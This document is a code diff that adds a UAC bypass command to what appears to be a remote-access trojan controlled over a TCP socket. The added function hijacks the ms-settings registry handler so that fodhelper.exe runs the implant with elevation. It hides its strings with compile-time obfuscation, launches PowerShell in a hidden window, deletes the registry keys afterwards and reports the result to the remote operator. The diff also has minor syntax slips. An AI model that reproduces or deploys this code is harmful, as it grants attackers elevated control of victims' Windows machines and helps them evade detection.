@@ -642,6 +642,41 @@ void FileExplorer(SOCKET Sock)
 	}
 }
 
+bool BypassUAC(SOCKET Sock)
+{
+	bool Success = true;
+	DirUtils du;
+	RegUtils ru;
+	SystemUtils su;
+	
+	if(!ru.RegMakeKey(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command")))
+		Success = false;
+	if(!ru.RegWrite(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", REG_SZ, AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\""))
+		Success = false;
+	if(!ru.RegMakeKey(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer")))
+		Success = false;
+	if(!ru.RegWrite(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"), "", REG_SZ, AY_OBFUSCATE(".pwn")))
+		Success = false;
+	
+	if (Success)
+		su.AsyncCMD(AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
+	
+	Sleep(3000);
+	
+	ru.RegDelKey(AY_OBFUSCATE("Software\Classes\ms-settings"));
+	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\.pwn"));
+	
+	if (du.CheckFile(du.GetModuleFilePath() + "Elevated"))
+	{
+		du.DelFile(du.GetModuleFilePath() + "Elevated")
+		TcpIP::SendString(Sock, "OK");
+		return true;
+	}
+	
+	TcpIP::SendString(Sock, "NO");
+	return false;
+}
+
 short Sessione(TcpIP Client)
 {
 	SystemUtils su;
@@ -701,6 +736,11 @@ short Sessione(TcpIP Client)
 		else if (cmd == "fileexplorer")
 		{
 			FileExplorer(Client.Sock);
+		}
+		else if (cmd == "bypassuac")
+		{
+			if (BypassUAC(Client.Sock))
+				return 1;
 		}
 	}
 
